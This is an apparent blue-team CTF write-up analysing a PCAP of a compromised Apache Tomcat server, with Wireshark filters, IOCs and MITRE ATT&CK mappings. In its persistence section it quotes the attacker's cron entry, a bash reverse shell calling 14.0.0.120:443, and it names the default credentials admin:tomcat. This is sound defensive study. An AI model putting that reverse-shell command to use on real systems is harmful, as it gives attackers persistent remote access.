# Tomcat Takeover Lab Investigation  


#### Overview 

This investigation documents a network traffic analysis of a compromised Apache Tomcat web server. The investigation is based on the [Tomcat Takeover lab](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/) from CyberDefenders and uses packet capture (PCAP) data to examine the attacker's activity.

#### Objective

The objective of this investigation is to analyze network traffic in Wireshark to identify the attacker's source IP address, examine reconnaissance and web enumeration activity, investigate authentication attempts, and identify evidence of successful exploitation. The analysis also aims to document indicators of compromise (IOCs) and map relevant attacker behaviors to the MITRE ATT&CK framework where applicable.

---

**Evidence:** Network PCAP file (~2MB)
  
**Tools:** Wireshark, VirusTotal, CyberChef

---
#### Indicators of Compromise (IOCs) and MITRE ATT&CK Summary

<table>
<tr>
<td valign="top">
  
| Indicator | Observed Value |
|---|---|
| Suspected attacker IP | `14.0.0.120` |
| Target host | `10.0.0.112` |
| Administrative service | Apache Tomcat Manager, TCP/8080 |
| Administrative paths | `/host-manager`, `/manager` |
| Deployed file | `JXQOZY.war` |
| Callback destination | `14.0.0.120:443` |
| Scheduled task | Cron-based recurring connection attempt |


</td>
<td valign="top">

| MITRE ATT&CK Technique | Observed Activity |
|---|---|
| `T1595.001` Active Scanning: Scanning IP Blocks | Port scan of the target host |
| `T1595.003` Active Scanning: Wordlist Scanning | Gobuster directory enumeration |
| `T1110.001` Brute Force: Password Guessing | Repeated Tomcat Manager login attempts |
| `T1078.001` Valid Accounts: Default Accounts | Logged in with `admin:tomcat` |
| `T1105` Ingress Tool Transfer | Uploaded `JXQOZY.war` |
| `T1053.003` Scheduled Task/Job: Cron | Cron job calling back every minute |
| `T1059.004` Command and Scripting Interpreter: Unix Shell | `bash -i` reverse shell |

</td>
</tr>
</table>

---


### Reconnaissance

<!-- A thin, dashed gray line -->
<hr style="border: none; border-top: 1px dashed #888888;">

> *Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?*

##### After opening the PCAP file in Wireshark, I began by reviewing the conversation statistics under `Statistics → Conversations → IPv4`. This provided an overview of IP communications, including the number of packets, bytes transferred, and communication endpoints.

<img width="1320" height="327" alt="IP_stats" src="https://github.com/user-attachments/assets/e238b7a1-007b-488c-8cdb-f881b3ac0c82" />


##### By sorting the conversations by packet count, I identified `14.0.0.120` as a suspicious source IP address due to its high volume of traffic directed toward the target server.

<img width="1450" height="583" alt="tomcat_port_scan" src="https://github.com/user-attachments/assets/71c03a47-b3bc-4c1d-ac5e-6201fddd9b0e" />

##### I then applied the following display filter to examine the traffic involving this IP address:

`ip.addr == 14.0.0.120`

##### Further analysis revealed that the attacker was scanning multiple ports on the target server, `10.0.0.112`, indicating potential reconnaissance activity.

##### *MITRE ATT&CK Technique:* [T1595.001](https://attack.mitre.org/techniques/T1595/001/) - Active Scanning: Scanning IP Blocks

---

> Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

##### I used VirusTotal to examine the IP address's available geolocation and registration information. The results associated the IP address with Guangzhou, China.

<img width="914" height="497" alt="Whois_lookup" src="https://github.com/user-attachments/assets/61b2c9bd-0c90-4d98-9fab-d720087eed20" />


---
### Web Enumeration
<!-- A thin, dashed gray line -->
<hr style="border: none; border-top: 1px dashed #888888;">

> Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

##### I applied the following Wireshark display filter to identify TCP packets containing SYN-ACK responses:
`tcp.flags.syn == 1 && tcp.flags.ack == 1`

##### These responses helped identify ports that appeared to be accepting TCP connection attempts. The ports identified were `22, 80, 443, 445, and 8080`.


<img width="1461" height="639" alt="tomcat_openports" src="https://github.com/user-attachments/assets/dd8409b0-a700-4960-8866-0431fd79170a" />

##### Because this investigation focuses on the web server's administrative interface, I narrowed my analysis to HTTP traffic involving the attacker's IP address. The traffic indicated that port '8080' was associated with access to the Tomcat Manager interface.

<img width="689" height="167" alt="tomcat_admin" src="https://github.com/user-attachments/assets/9b6f0e77-32cf-4972-93a0-3b565fe874d2" />

##### *MITRE ATT&CK Technique:* [T1595.001](https://attack.mitre.org/techniques/T1595/001/) - Active Scanning: Scanning IP Blocks

---

> Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

##### I followed  HTTP stream `9452` in Wireshark to examine the HTTP requests more closely. The traffic contained evidence identifying Gobuster as the directory enumeration tool used by the attacker.

<img width="821" height="366" alt="tomcat_tool" src="https://github.com/user-attachments/assets/1a868608-cec1-44d7-9ddb-c1cb7886e117" />

##### Gobuster can be used to discover directories and files on web servers by sending requests to potential paths. In this investigation, the observed requests were consistent with directory enumeration intended to identify accessible resources and administrative interfaces.

##### The use of this tool, combined with the suspicious source IP address and subsequent activity, supports the conclusion that the requests were part of the attacker's reconnaissance.

##### *MITRE ATT&CK Technique:* [T1595.003](https://attack.mitre.org/techniques/T1595/003/) - Active Scanning: Wordlist Scanning
---
### Administrative Directory Discovery
<!-- A thin, dashed gray line -->
<hr style="border: none; border-top: 1px dashed #888888;">

> Q5: After enumerating directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which directory related to the admin panel did the attacker uncover? (Provide the path including the leading slash, e.g. /path)

##### By analyzing the HTTP requests generated during directory enumeration, I identified the `/host-manager` and `/manager` paths associated with the Tomcat administrative interfaces.

<img width="1377" height="310" alt="tomcat_hostmanager" src="https://github.com/user-attachments/assets/f05524f7-6cc1-47b3-86c6-c5812de6436e" />



<img width="1385" height="117" alt="tomcat_manager" src="https://github.com/user-attachments/assets/c65f812e-85c6-45dd-8347-b1aa54be180b" />


---

> Q6: After accessing the admin panel, the attacker brute-forced the login. What credentials did the attacker successfully use? (Provide them in username:password format)

##### I analyzed the relevant TCP streams and identified repeated attempts to authenticate to the Tomcat Manager interface.

<img width="668" height="232" alt="tomcat_brute_attempts" src="https://github.com/user-attachments/assets/8c49e772-f2b8-4527-b719-5fc7523eff8a" />

##### I then applied the following Wireshark display filter to isolate `HTTP POST` requests originating from the attacker's IP address:
`ip.src == 14.0.0.120 && http.request.method == "POST"`

<img width="1244" height="744" alt="tomcat_brute" src="https://github.com/user-attachments/assets/9c4e3244-045f-47ec-8f84-eb778ca4c88a" />

##### By examining packet `20616`, I identified the credentials the attacker used to authenticate successfully to the Tomcat Manager application.

- **Username:** `admin`
- **Password:** `tomcat`

##### Additionally, the observed authentication attempt and subsequent `HTTP/1.1 200 OK` response support the conclusion that the attacker obtained valid credentials.

<img width="773" height="316" alt="tomcat_encrypted" src="https://github.com/user-attachments/assets/985f734b-4f04-4958-87ef-226f29a8cb5e" />

##### I analyzed `tcp.stream eq 9456` in Wireshark and identified Base64-encoded data containing the credentials used by the attacker. I decoded the string using CyberChef to reveal the plaintext credentials.

<img width="452" height="398" alt="tomcat_cyberchef" src="https://github.com/user-attachments/assets/95ec6818-033b-41d3-9fd3-e9e217ec69e7" />

##### *MITRE ATT&CK Techniques:* 
- [T1110.001](https://attack.mitre.org/techniques/T1110/001/) - Brute Force: Password Guessing
- [T1078.001](https://attack.mitre.org/techniques/T1078/001/) - Valid Accounts: Default Accounts



---
### Application Deployment

<!-- A thin, dashed gray line -->
<hr style="border: none; border-top: 1px dashed #888888;">


> Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

##### Packet `20616` contains evidence of a request to upload a `WAR` file through the Tomcat Manager interface.

<img width="1422" height="130" alt="manager_upload" src="https://github.com/user-attachments/assets/f11d5cf9-c2f8-41a1-9edc-412e3fca2cbe" />

##### After analyzing the HTTP traffic, I identified the filename `JXQOZY.war` and the deployment action associated with the request, `deploywar`.

<img width="815" height="185" alt="attack_war" src="https://github.com/user-attachments/assets/b3bcbea9-d7dd-4d42-b581-f8cb797a0285" />

##### The subsequent packet, `20642`, contains an `HTTP 200 OK` response, indicating that the server successfully processed the request. This supports the conclusion that the upload or deployment request succeeded.

##### *MITRE ATT&CK Technique:* [T1105](https://attack.mitre.org/techniques/T1105/) - Ingress Tool Transfer


---
### Persistence

<!-- A thin, dashed gray line -->
<hr style="border: none; border-top: 1px dashed #888888;">

> Q8: After the attacker established a reverse shell on our server, the payload connects back to the attacker's machine. From the analysis, what is the callback destination in IP:port format?

##### After gaining access through the reverse shell, the attacker configured a cron job to attempt to maintain persistent access to the server. By following TCP stream `9461` in Wireshark, I identified the following cron entry:

- **Command:** `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`

<img width="682" height="319" alt="shell" src="https://github.com/user-attachments/assets/c720f7bb-abce-4677-b75a-b21450584fb6" />


##### The cron expression `* * * * *` schedules the command to run every minute. The Bash command attempts to establish an interactive reverse shell connection to the attacker's machine at `14.0.0.120` over TCP port `443`. The callback destination is `14.0.0.120:443`.

##### If the cron job remains active and the destination is reachable, this recurring connection attempt could allow the attacker to regain access after an existing session ends.

##### *MITRE ATT&CK Techniques:*
- [T1053.003](https://attack.mitre.org/techniques/T1053/003/) - Scheduled Task/Job: Cron
- [T1059.004](https://attack.mitre.org/techniques/T1059/004/) - Command and Scripting Interpreter: Unix Shell
  
---

## Conclusion
<!-- A thin, dashed gray line -->
<hr style="border: none; border-top: 1px dashed #888888;">

This investigation showed how a single exposed service with weak credentials can lead to a full compromise. Using Wireshark, I traced the attacker IP address from the initial port scan through the cron-based callback. This attack could have been prevented at several points: changing the default credentials, restricting sensitive resources to trusted IPs, limiting login attempts, filtering outbound traffic on port 443, and alerting on new WAR deployments or cron changes. This lab gave me hands-on practice following an attack through packet analysis, connecting my findings to MITRE ATT&CK techniques, and recommending defensive fixes.
